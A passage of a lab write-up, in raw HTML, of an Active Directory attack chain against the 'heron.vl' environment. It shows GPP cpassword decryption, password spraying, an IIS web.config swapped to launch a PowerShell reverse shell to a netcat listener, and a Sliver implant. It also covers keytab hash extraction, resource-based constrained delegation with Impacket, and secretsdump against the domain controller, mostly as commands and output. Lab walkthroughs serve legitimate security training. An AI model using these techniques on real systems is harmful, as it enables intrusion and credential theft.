&#x27;samuel.davies&#x27;                     </span><br><span class=\"line\">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class=\"line\">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class=\"line\">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:445  ...  OK</span><br><span class=\"line\">Password for [WORKGROUP\\samuel.davies]:</span><br><span class=\"line\"></span><br><span class=\"line\">Sharename       Type      Comment</span><br><span class=\"line\">---------       ----      -------</span><br><span class=\"line\">accounting$     Disk      </span><br><span class=\"line\">ADMIN$          Disk      Remote Admin</span><br><span class=\"line\">C$              Disk      Default share</span><br><span class=\"line\">CertEnroll      Disk      Active Directory Certificate Services share</span><br><span class=\"line\">home$           Disk      </span><br><span class=\"line\">IPC$            IPC       Remote IPC</span><br><span class=\"line\">it$             Disk      </span><br><span class=\"line\">NETLOGON        Disk      Logon server share </span><br><span class=\"line\">SYSVOL          Disk      Logon server share </span><br><span class=\"line\">transfer$       Disk</span><br></pre></td></tr></table></figure>\n\n<p>As you can see it seems that there are a lot of shares that are on the DC. </p>\n<p>I’ll save us the time due to some prior enumeration that I did into this - it seems that we cannot access <code>accounting$</code> and <code>it$</code>, and <code>home$</code> and <code>transfer$</code> do not seem to have any files within any of their folders. </p>\n<p><code>CertEnroll</code> did seem suspicious at first, as there seems to be a few expired ADCS certifications that I initially thought could be reused for exploitation. I eventually deduced this to be a rabbit hole and moved elsewhere.</p>\n<p>The interesting part that I found however was in the <code>SYSVOL</code> share. I don’t normally find much in this share (aside from the logon script exploit that I did for <a href=\"https://dan-feliciano.com/2024/06/05/baby2/\">Baby2</a>), however it’s still important to enumerate everything possible in every share that you have access to for this service.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">smb: \\heron.vl\\Policies\\&#123;6CC75E8D-586E-4B13-BF80-B91BEF1F221C&#125;\\Machine\\Preferences\\Groups\\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Tue Jun  4 11:59:44 2024</span><br><span class=\"line\">  ..                                  D        0  Tue Jun  4 11:59:44 2024</span><br><span class=\"line\">  Groups.xml                          A     1135  Tue Jun  4 12:01:07 2024</span><br></pre></td></tr></table></figure>\n\n<p>It seems that there is an XML file that we have read access to on the <code>SYSVOL</code> share. We’ll pull this down to our local machine to see if in contains any relevant information.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class=\"line\">&lt;Groups clsid=&quot;&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;&quot;&gt;&lt;Group clsid=&quot;&#123;6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7&#125;&quot; name=&quot;Administrators (built-in)&quot; image=&quot;2&quot; changed=&quot;2024-06-04 15:59:45&quot; uid=&quot;&#123;535B586D-9541-4420-8E32-224F589E4F3A&#125;&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; description=&quot;&quot; deleteAllUsers=&quot;0&quot; deleteAllGroups=&quot;0&quot; removeAccounts=&quot;0&quot; groupSid=&quot;S-1-5-32-544&quot; groupName=&quot;Administrators (built-in)&quot;&gt;&lt;Members&gt;&lt;Member name=&quot;HERON\\svc-web-accounting&quot; action=&quot;ADD&quot; sid=&quot;S-1-5-21-1568358163-2901064146-3316491674-24602&quot;/&gt;&lt;Member name=&quot;HERON\\svc-web-accounting-d&quot; action=&quot;ADD&quot; sid=&quot;S-1-5-21-1568358163-2901064146-3316491674-26101&quot;/&gt;&lt;/Members&gt;&lt;/Properties&gt;&lt;/Group&gt;</span><br><span class=\"line\">        &lt;User clsid=&quot;&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;&quot; name=&quot;Administrator (built-in)&quot; image=&quot;2&quot; changed=&quot;2024-06-04 16:00:13&quot; uid=&quot;&#123;F3B0115E-D062-46CC-B10C-C3EB743C824A&#125;&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;_local&quot; fullName=&quot;&quot; description=&quot;local administrator&quot; cpassword=&quot;[...snip...]&quot; changeLogon=&quot;0&quot; noChange=&quot;0&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; subAuthority=&quot;RID_ADMIN&quot; userName=&quot;Administrator (built-in)&quot;/&gt;&lt;/User&gt;</span><br><span class=\"line\">&lt;/Groups&gt;</span><br></pre></td></tr></table></figure>\n\n<p>The file itself seems to be configuring two of the domain user objects, specifically <code>svc-web-accounting</code> and <code>svc-web-accounting-d</code>. It seems that there also seems to be an encoded password for the “local administrator” user at the bottom of the file.</p>\n<p>I’ve seen this <code>cpassword</code> term before in other exploits that I’ve done in the past, and I do recall a tool that we can use to crack this password specifically. That tool is <a href=\"https://github.com/t0thkr1s/gpp-decrypt\">gpp-decrypt</a>. I’d tried to interpret the code a bit before doing it to understand what it was exactly doing. It seems that script takes the password and adds base64 padding to it before decoding the entire base64 string based on a specific AES key that is used for the <code>gpp</code> algorithm.</p>\n<p>We can use the Python POC without needing to use the setup script within the repository, as seen below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 gpp-decrypt/gpp-decrypt.py -f Groups.xml </span><br><span class=\"line\"></span><br><span class=\"line\">                               __                                __ </span><br><span class=\"line\">  ___ _   ___    ___  ____ ___/ / ___  ____  ____  __ __   ___  / /_</span><br><span class=\"line\"> / _ `/  / _ \\  / _ \\/___// _  / / -_)/ __/ / __/ / // /  / _ \\/ __/</span><br><span class=\"line\"> \\_, /  / .__/ / .__/     \\_,_/  \\__/ \\__/ /_/    \\_, /  / .__/\\__/ </span><br><span class=\"line\">/___/  /_/    /_/                                /___/  /_/         </span><br><span class=\"line\"></span><br><span class=\"line\">[ * ] Username: Administrator (built-in)</span><br><span class=\"line\">[ * ] Password: [...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>This returns a password for the built-in Administrator user (which is not the Administrator of the DC), so we’ll run this against our user list to see if the password corresponds to any users.</p>\n<p>Quick note, make sure to use the actual username for <code>svc-web-accounting-d</code> in the user list, as the LDAP command we used from before takes their display name which is <code>svc-web-accounting-dev</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 crackmapexec smb 10.10.128.117 -u full_ul.txt -p &#x27;(BUILT-IN ADMINISTRATOR PASSWORD)&#x27;</span><br><span class=\"line\">......</span><br><span class=\"line\">SMB         10.10.128.117   445    MUCDC            [+] heron.vl\\svc-web-accounting-d:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, this should return a valid username&#x2F;password combination for <code>svc-web-accounting-d</code>.</p>\n<h1 id=\"Exploiting-the-Accounting-App\"><a href=\"#Exploiting-the-Accounting-App\" class=\"headerlink\" title=\"Exploiting the Accounting App\"></a>Exploiting the Accounting App</h1><p>Note that at this point I took a break in between creating this writeup, so the IP addresses will change. The updated addresses for <code>mucdc.heron.vl</code> and <code>frajmp.heron.vl</code> are <code>10.10.220.53</code> and <code>10.10.220.54</code>.</p>\n<p>Since we have valid credentials for <code>svc-web-accounting-d</code>, I decided to see if we had access to the <code>accounting$</code> SMB share that we saw previously.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 smbclient \\\\\\\\10.10.220.53\\\\accounting$ -U &#x27;svc-web-accounting-d&#x27;</span><br><span class=\"line\">Password for [WORKGROUP\\svc-web-accounting-d]:</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.220.54:445  ...  OK</span><br><span class=\"line\">Try &quot;help&quot; to get a list of possible commands.</span><br><span class=\"line\">smb: \\&gt; ls</span><br><span class=\"line\"></span><br><span class=\"line\">  .                                   D        0  Fri Jun  7 02:14:04 2024</span><br><span class=\"line\">  ..                                DHS        0  Sun Jun  2 11:26:14 2024</span><br><span class=\"line\">  AccountingApp.deps.json             A    37407  Sun Jun  2 15:25:26 2024</span><br><span class=\"line\">  AccountingApp.dll                   A    89600  Sun Jun  2 15:25:26 2024</span><br><span class=\"line\">  AccountingApp.exe                   A   140800  Sun Jun  2 15:25:26 2024</span><br><span class=\"line\">  AccountingApp.pdb                   A    39488  Sun Jun  2 15:25:26 2024</span><br><span class=\"line\">  AccountingApp.runtimeconfig.json      A      557  Sat Jun  1 18:22:20 2024</span><br><span class=\"line\">  appsettings.Development.json        A      127  Sat Jun  1 18:00:54 2024</span><br><span class=\"line\">  ......</span><br></pre></td></tr></table></figure>\n\n<p>It seems that we successfully were able to gain access to the <code>accounting$</code> share, and there seem to be a lot within the contents of this share.</p>\n<p>There seems to be a consistent notice of this share having contents related to an accounting app, based on the file names. My guess to this is that this could potentially be the configuration directory for the accounting subdomain we found earlier.</p>\n<p>Given that we have access to all of these files, I’m assuming that these will be valid credentials to the simple authentication that this website requires.</p>\n<p><img src=\"/images/vulnlab/heron-vl/g.png\"></p>\n<p>Entering in the credentials for <code>svc-web-accounting-d</code> seems to land us at the respective accounting application. This cements my theory that the SMB share seems to be linked to the backend of this application.</p>\n<p>Given that we have access to the files that build up the accounting app, I’m assuming that we should have RCE if we exploit this appropriately. Let’s take a look further into this share to see if there are any files to exploit.</p>\n<p>After doing a bit of research into this application (finding that this is an IIS application running ASP.NET), the actual exploitation consists of the <code>web.config</code> file that is located on the root directory of this SMB share.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class=\"line\">&lt;configuration&gt;</span><br><span class=\"line\">  &lt;location path=&quot;.&quot; inheritInChildApplications=&quot;false&quot;&gt;</span><br><span class=\"line\">    &lt;system.webServer&gt;</span><br><span class=\"line\">      &lt;handlers&gt;</span><br><span class=\"line\">        &lt;add name=&quot;aspNetCore&quot; path=&quot;*&quot; verb=&quot;*&quot; modules=&quot;AspNetCoreModuleV2&quot; resourceType=&quot;Unspecified&quot; /&gt;</span><br><span class=\"line\">      &lt;/handlers&gt;</span><br><span class=\"line\">      &lt;aspNetCore processPath=&quot;dotnet&quot; arguments=&quot;.\\AccountingApp.dll&quot; stdoutLogEnabled=&quot;false&quot; stdoutLogFile=&quot;.\\logs\\stdout&quot; hostingModel=&quot;inprocess&quot; /&gt;</span><br><span class=\"line\">    &lt;/system.webServer&gt;</span><br><span class=\"line\">  &lt;/location&gt;</span><br><span class=\"line\">&lt;/configuration&gt;</span><br><span class=\"line\">&lt;!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4--&gt;</span><br></pre></td></tr></table></figure>\n\n<p>This file specifically seems to be related to the runtime arguments that actually define how this application is initialized. As we can see, the <code>aspNetCore</code> module is created by executing <code>AccountingApp.dll</code>, which I’m assuming is then chained to execute all of the other libraries within this directory.</p>\n<p>After doing some research, I found an RCE exploit that we can utilize that uses <code>aspNetCore</code> module that is already present in the configuration file. The resource I used for RCE exploit can be found <a href=\"https://medium.com/@jeroenverhaeghe/rce-from-web-config-461a5eab8ce9\">here</a>, all credit goes to Jeroen Verhaeghe.</p>\n<p>If we alter the <code>aspNetCore</code> module to instead use PowerShell as its process path, we can pass in PowerShell arguments into the arguments section within the module. In theory, this should render the website unusable due to the application requiring the serialization of <code>AccountingApp.dll</code>. That being said, it should execute our payload before receiving this error. This was essentially the only way to achieve RCE that I found, I am open to understanding other ways to achieve this without rendering the web application unusable.</p>\n<p>So with that being said let’s replace the module initialization and the actual module itself, I’ve made the necessary changes to the file as seen below (Note that the payload that I’m using is from <a href=\"https://www.revshells.com/\">revshells</a>).</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class=\"line\">&lt;configuration&gt;</span><br><span class=\"line\">  &lt;location path=&quot;.&quot; inheritInChildApplications=&quot;false&quot;&gt;</span><br><span class=\"line\">    &lt;system.webServer&gt;</span><br><span class=\"line\">      &lt;handlers&gt;</span><br><span class=\"line\">        &lt;add name=&quot;aspNetCore&quot; path=&quot;execute.now&quot; verb=&quot;*&quot; modules=&quot;AspNetCoreModuleV2&quot; resourceType=&quot;Unspecified&quot; /&gt;</span><br><span class=\"line\">      &lt;/handlers&gt;</span><br><span class=\"line\">      &lt;aspNetCore processPath=&quot;powershell&quot; arguments=&quot;-e (POWERSHELL BASE64 PAYLOAD)&quot; hostingModel=&quot;OutOfProcess&quot; /&gt;</span><br><span class=\"line\">    &lt;/system.webServer&gt;</span><br><span class=\"line\">  &lt;/location&gt;</span><br><span class=\"line\">&lt;/configuration&gt;</span><br><span class=\"line\">&lt;!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4--&gt;</span><br></pre></td></tr></table></figure>\n\n<p>The <code>POWERSHELL BASE64 PAYLOAD</code> that I used was the PowerShell #3 Base64 payload from <a href=\"https://www.revshells.com/\">revshells</a>.</p>\n<p>We’ll start up our listener using <code>nc -lvnp 9002</code> and replace the <code>web.config</code> file that is currently in the SMB share with the new changes. You can do so by just removing the current config and putting your new config in the share.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">smb: \\&gt; rm web.config</span><br><span class=\"line\">smb: \\&gt; put web.config</span><br><span class=\"line\">putting file web.config as \\web.config (5.8 kb/s) (average 5.8 kb/s)</span><br></pre></td></tr></table></figure>\n\n<p>Let’s now browse to the path that we specified to execute the PowerShell payload, which is <code>http://accounting.heron.vl/execute.now</code>.</p>\n<p>As you can see from the netcat payload, we’ll receive a callback as <code>svc-web-accounting</code> on the DC.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ nc -lvnp 9002      </span><br><span class=\"line\">listening on [any] 9002 ...</span><br><span class=\"line\">connect to [10.8.0.173] from (UNKNOWN) [10.10.220.53] 58887</span><br><span class=\"line\">PS C:\\webaccounting&gt; whoami</span><br><span class=\"line\">heron\\svc-web-accounting</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Credential-Hunting-as-svc-web-accounting\"><a href=\"#Credential-Hunting-as-svc-web-accounting\" class=\"headerlink\" title=\"Credential Hunting as svc-web-accounting\"></a>Credential Hunting as svc-web-accounting</h1><p>The interesting part that I found about this is that fact that there is a timeout on the web application that will essentially crash our current reverse shell after about a minute. This isn’t very good practice in the real world, however it’s essentially all that we can do at this with the only POC that I could think of. Again, very open to any different solutions that keep the reverse shell continuously up.</p>\n<p><img src=\"/images/vulnlab/heron-vl/h.png\"></p>\n<p>Luckily enough we can continue to get a reverse shell if we reopen our netcat listener and refresh the <code>execute.now</code> page. Had <code>svc-web-accounting</code> not been kerberoastable and their password WAS crackable, we could simply poison a request to a Responder endpoint and crack their NetNTLMv2 hash.</p>\n<p>Luckily enough, we won’t need this shell for very long. At this point, I enumerated the filesystem in between the intervals of the web application crashing. The <code>C:\\</code> drive seems to be the parent directory of all of the SMB shares. </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Directory: C:\\</span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name</span><br><span class=\"line\">----                 -------------         ------ ----</span><br><span class=\"line\">d-----          6/1/2024   8:10 AM                home</span><br><span class=\"line\">d-----         5/26/2024   2:31 AM                inetpub</span><br><span class=\"line\">d-----          6/6/2024   7:22 AM                it</span><br><span class=\"line\">d-----          5/8/2021   1:20 AM                PerfLogs</span><br><span class=\"line\">d-r---          6/6/2024   7:22 AM                Program Files</span><br><span class=\"line\">d-----          6/1/2024   7:30 AM                Program Files (x86)</span><br><span class=\"line\">d-----         5/26/2024   4:51 AM                transfer</span><br><span class=\"line\">d-r---          6/1/2024   8:43 AM                Users</span><br><span class=\"line\">d-----         6/28/2024  12:38 PM                webaccounting</span><br><span class=\"line\">d-----          6/2/2024   8:26 AM                Windows</span><br><span class=\"line\">-a----          6/2/2024   3:45 AM             36 flag.txt</span><br></pre></td></tr></table></figure>\n\n<p>You can also see that the first flag is within the <code>C:\\</code> drive, meaning we have completed a 1&#x2F;3 of this chain.</p>\n<p>To save some time, I spent a decent amount of attempts looking through all of the folders recursively to see if any DPAPI credentials or really just any credentials were cached in any files. After about an hour of credential hunting, I came across a file within <code>C:\\Windows\\scripts\\ssh.ps1</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Windows\\scripts&gt; cat ssh.ps1</span><br><span class=\"line\">$plinkPath = &quot;C:\\Program Files\\PuTTY\\plink.exe&quot;</span><br><span class=\"line\">$targetMachine = &quot;frajmp&quot;</span><br><span class=\"line\">$user = &quot;_local&quot;</span><br><span class=\"line\">$password = &quot;[...snip...]&quot;</span><br><span class=\"line\">&amp; &quot;$plinkPath&quot; -ssh -batch $user@$targetMachine -pw $password &quot;ps auxf; ls -lah /home; exit&quot;</span><br></pre></td></tr></table></figure>\n\n<p>This seems to contain the SSH password for the <code>_local</code> user. An admin user was probably trying to establish an SSH session to the <code>frajmp</code> jumpbox as this user using PuTTY.</p>\n<p>Now that we have these credentials, we can try to login as this user on the jumpbox. We also won’t need our reverse shell as <code>svc-web-accounting</code> any longer.</p>\n<h1 id=\"Root-Access-to-FRAJMP\"><a href=\"#Root-Access-to-FRAJMP\" class=\"headerlink\" title=\"Root Access to FRAJMP\"></a>Root Access to FRAJMP</h1><p>Now that we have access as this user, we’ll login in our other session as <code>pentest</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pentest@frajmp:/tmp$ su _local</span><br><span class=\"line\">Password: </span><br><span class=\"line\">_local@frajmp:/tmp$</span><br></pre></td></tr></table></figure>\n\n<p>Testing our root access with the password that we currently have indicates to me that this user has SUDO privileges to the entire filesystem.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">_local@frajmp:/tmp$ sudo -l</span><br><span class=\"line\">[sudo] password for _local: </span><br><span class=\"line\">Matching Defaults entries for _local on localhost:</span><br><span class=\"line\">    env_reset, mail_badpass,</span><br><span class=\"line\">    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,</span><br><span class=\"line\">    use_pty</span><br><span class=\"line\"></span><br><span class=\"line\">User _local may run the following commands on localhost:</span><br><span class=\"line\">    (ALL : ALL) ALL</span><br></pre></td></tr></table></figure>\n\n<p>Since we have that, we can simply log in as the root user using <code>sudo su</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">_local@frajmp:/tmp$ sudo su</span><br><span class=\"line\">root@frajmp:/tmp# whoami</span><br><span class=\"line\">root</span><br></pre></td></tr></table></figure>\n\n<p>The second flag for this machine is within the root users home directory in <code>/root</code>. There isn’t much to see aside from that, I did some file enumeration and did not come back with much.</p>\n<p>I’ll execute our Sliver implant just to ensure that we have access to the root user through our C2 server. This is just in case we need to tunnel any tools to the DC with the highest privilege on <code>FRAJMP</code>. –&gt; <code>./heron_lin &amp;</code></p>\n<p><img src=\"/images/vulnlab/heron-vl/i.png\"></p>\n<h1 id=\"Pivoting-to-the-DC\"><a href=\"#Pivoting-to-the-DC\" class=\"headerlink\" title=\"Pivoting to the DC\"></a>Pivoting to the DC</h1><p>Now that we have completely compromised the <code>FRAJMP</code> jumpbox, we can extract a very important piece of information on domain-joined Linux machines that I learned to exploit during <a href=\"https://dan-feliciano.com/2024/06/05/hybrid/\">Hybrid</a>.</p>\n<p>There’s a file that exists on domain-joined Linux machines called <code>krb5.keytab</code>, which contains secrets to the machine account. If this file is decrypted, we can view the machine accounts NT hash. This machine account has the potential to have privileges that can lead us to the DC.</p>\n<p>We can use a tool called <a href=\"https://github.com/sosdave/KeyTabExtract\">KeyTabExtract</a> for this. The Python script associated with this allows us to match key values with their encryption types, varying from different types of AES encryption algorithms. Once decrypted with the keytab file (you can download this to your local machine using Sliver), you should receive an output similar to the below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 KeyTabExtract/keytabextract.py krb5.keytab </span><br><span class=\"line\">[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.</span><br><span class=\"line\">[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.</span><br><span class=\"line\">[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.</span><br><span class=\"line\">[+] Keytab File successfully imported.</span><br><span class=\"line\">        REALM : HERON.VL</span><br><span class=\"line\">        SERVICE PRINCIPAL : FRAJMP$/</span><br><span class=\"line\">        NTLM HASH : 6f55b[...snip...]e8254f7</span><br><span class=\"line\">        AES-256 HASH : 7be44e62e24[...snip...]a3050dd586130e7</span><br><span class=\"line\">        AES-128 HASH : dcaae[...snip...]6cbd0cd</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have this machine account we would be able to use it in a variety of different domain escalation tactics if <code>FRAJMP$</code> has any privileges over any other domain objects.</p>\n<p>That being said, we actually are not required to do this. I did some testing with <code>crackmapexec</code> to see if their was any password reusage on the <code>_local</code> user credentials that we have and came back with a successful result to a new user.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 crackmapexec smb 10.10.220.53 -u full_ul.txt -p &#x27;(_local PASSWORD)&#x27; --continue-on-success</span><br><span class=\"line\">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class=\"line\">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class=\"line\">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.220.53:445  ...  OK</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.220.53:135  ...  OK</span><br><span class=\"line\">......</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.220.53:445  ...  OK</span><br><span class=\"line\">SMB         10.10.220.53    445    MUCDC            [+] heron.vl\\Julian.Pratt:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, the <code>Julian.Pratt</code> user seems to have the same password as the <code>_local</code> user on the jumpbox. We can assume that <code>Julian.Pratt</code> (with him being the head of IT) was attempting to try and set up an SSH connection to <code>FRAJMP</code> using PuTTY.</p>\n<p>Since we have access to this user now with his credentials, we can login to his home directory that is being hosted on SMB.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">smb: \\Julian.Pratt\\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Sun Jun  2 06:47:14 2024</span><br><span class=\"line\">  ..                                  D        0  Sat Jun  1 11:10:46 2024</span><br><span class=\"line\">  frajmp.lnk                          A     1443  Sun Jun  2 06:47:47 2024</span><br><span class=\"line\">  Is there a way to -auto login- in PuTTY with a password- - Super User.url      A      117  Sat Jun  1 11:44:44 2024</span><br><span class=\"line\">  Microsoft Edge.lnk                  A     2312  Sat Jun  1 11:44:38 2024</span><br><span class=\"line\">  mucjmp.lnk                          A     1441  Sun Jun  2 06:47:33 2024</span><br></pre></td></tr></table></figure>\n\n<p>It seems that this contains a multitude of <code>lnk</code> files that we can pull from this share. We’ll use <code>mget *</code> to read these on our local machine.</p>\n<p><code>frajmp.lnk</code> seems to be partially unreadable, however it contains the plaintext password for <code>_local</code> and <code>Julian.Pratt</code> that we already have. <code>Microsoft Edge.lnk</code> also does not seem to have anything of use to us, containing some directory calls to the Edge application.</p>\n<p>The part of use to us seems to be within <code>mucjmp.lnk</code>, which seems to contain the plaintext password for <code>adm_prju</code> amongst some unreadable text.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ cat mucjmp.lnk                                                                 </span><br><span class=\"line\">2t▒`��ف+B�� �gP�O� �:i�+00�/C:\\�1�X�sPROGRA~1t  ﾨR�B�X�s.BJz</span><br><span class=\"line\">AProgram Files@shell32.dll,-21781▒P1�X�[PuTTY&lt;  ﾺX�[�X�[.���PuTTY\\2 ��X�� putty.exeD    ﾆX���X�[.putty.exe▒O-N�h�ZC:\\Program Files\\PuTTY\\putty.exe#..\\..\\Program Files\\PuTTY\\putty.exeC:\\Program Files\\PuTTY$adm_prju@mucjmp -pw [...snip...]�&amp;�</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"RBCD-to-MUCDC\"><a href=\"#RBCD-to-MUCDC\" class=\"headerlink\" title=\"RBCD to MUCDC\"></a>RBCD to MUCDC</h1><p>If we look at <code>adm_prju</code>‘s domain node in Bloodhound, we can see that they possess an interesting outbound access control.</p>\n<p><img src=\"/images/vulnlab/heron-vl/j.png\"></p>\n<p>It seems that since <code>adm_prju</code> is within the <code>ADMINS_T1</code> group, they have the <code>WriteAccountRestrictions</code> privilege over the domain controller.</p>\n<p>Having <code>WriteAccountRestrictions</code> means that <code>adm_prju</code> has write access to all of the attributes on the machine, notably <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>. If we have the ability to modify this attribute, this means we can abuse resource-based constrained delegation.</p>\n<p>For a small note on what resource-based constrained delegation is, it essentially allows us to request a service ticket for a specified service name to which will be impersonated by a user of our selection. We can then import this service ticket to use for either authentication or credential dumping, depending on the user we impersonate.</p>\n<p>The process for this is relatively simple, as Bloodhound outlines our attach flow in their help page for this specific attack. Note that this requires the user to have control of a machine that has an SPN set, which we currently do since we have control over <code>FRAJMP</code> and it’s NT hash (meaning we’ll just need to PTH with the <code>FRAJMP$</code> NT hash in our commands instead of a password).</p>\n<p>So to start let’s ensure that <code>FRAJMP$</code> can delegate on behalf of <code>MUCDC$</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 impacket-rbcd -delegate-from &#x27;FRAJMP$&#x27; -delegate-to &#x27;MUCDC$&#x27; -action &#x27;write&#x27; &#x27;heron.vl/adm_prju:(ADM_PRJU PASSWORD)&#x27;</span><br><span class=\"line\">......</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  heron.vl:389  ...  OK</span><br><span class=\"line\">[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty</span><br><span class=\"line\">[*] Delegation rights modified successfully!</span><br><span class=\"line\">[*] FRAJMP$ can now impersonate users on MUCDC$ via S4U2Proxy</span><br><span class=\"line\">[*] Accounts allowed to act on behalf of other identity:</span><br><span class=\"line\">[*]     FRAJMP$      (S-1-5-21-1568358163-2901064146-3316491674-27101)</span><br></pre></td></tr></table></figure>\n\n<p>Now that the jumpbox can delegate on behalf of the domain controller, we can request the TGT with Impacket’s <code>getST</code> tool. This will utilize both <code>S4U2Self</code> and <code>S4U2Proxy</code> to impersonate the specified user and obtain a valid service ticket for that user. </p>\n<p>I found that the Administrator account is disabled and was replaced with <code>_admin</code>, so we’ll request for that user instead. You could also request to impersonate <code>MUCDC$</code>, as we’ll be able to dump credentials with both of those accounts.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 impacket-getST -spn &#x27;cifs/mucdc.heron.vl&#x27; -impersonate &#x27;_admin&#x27; &#x27;heron.vl/FRAJMP$&#x27; -hashes :(FRAJMP NT HASH)</span><br><span class=\"line\">......</span><br><span class=\"line\">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">[-] CCache file is not found. Skipping...</span><br><span class=\"line\">[*] Getting TGT for user</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  HERON.VL:88  ...  OK</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  HERON.VL:88  ...  OK</span><br><span class=\"line\">[*] Impersonating _admin</span><br><span class=\"line\">[*] Requesting S4U2self</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  heron.vl:88  ...  OK</span><br><span class=\"line\">[*] Requesting S4U2Proxy</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  heron.vl:88  ...  OK</span><br><span class=\"line\">[*] Saving ticket in _admin@cifs_mucdc.heron.vl@HERON.VL.ccache</span><br></pre></td></tr></table></figure>\n\n<p>The ticket should be saved in an appropriate file with a file name specified at the bottom of the command.</p>\n<p>Let’s now set our Kerberos authentication global variable to be directed to this ticket. Note that if you impersonated the <code>MUCDC$</code> machine account, you may need to rename the ticket so that the <code>$</code> special character doesn’t conflict with the global variable setting.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ export KRB5CCNAME=_admin@cifs_mucdc.heron.vl@HERON.VL.ccache</span><br></pre></td></tr></table></figure>\n\n<p>Now we can attempt to dump all of the secrets through our SOCKS proxy using Impacket’s <code>secretsdump</code> command with our Kerberos ticket. The output may be slow since it has to tunnel through the proxy so be sure to give it some time.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 impacket-secretsdump -k mucdc.heron.vl</span><br><span class=\"line\">......</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.220.53:445  ...  OK</span><br><span class=\"line\">[*] Service RemoteRegistry is in stopped state</span><br><span class=\"line\">[*] Starting service RemoteRegistry</span><br><span class=\"line\">[*] Target system bootKey: 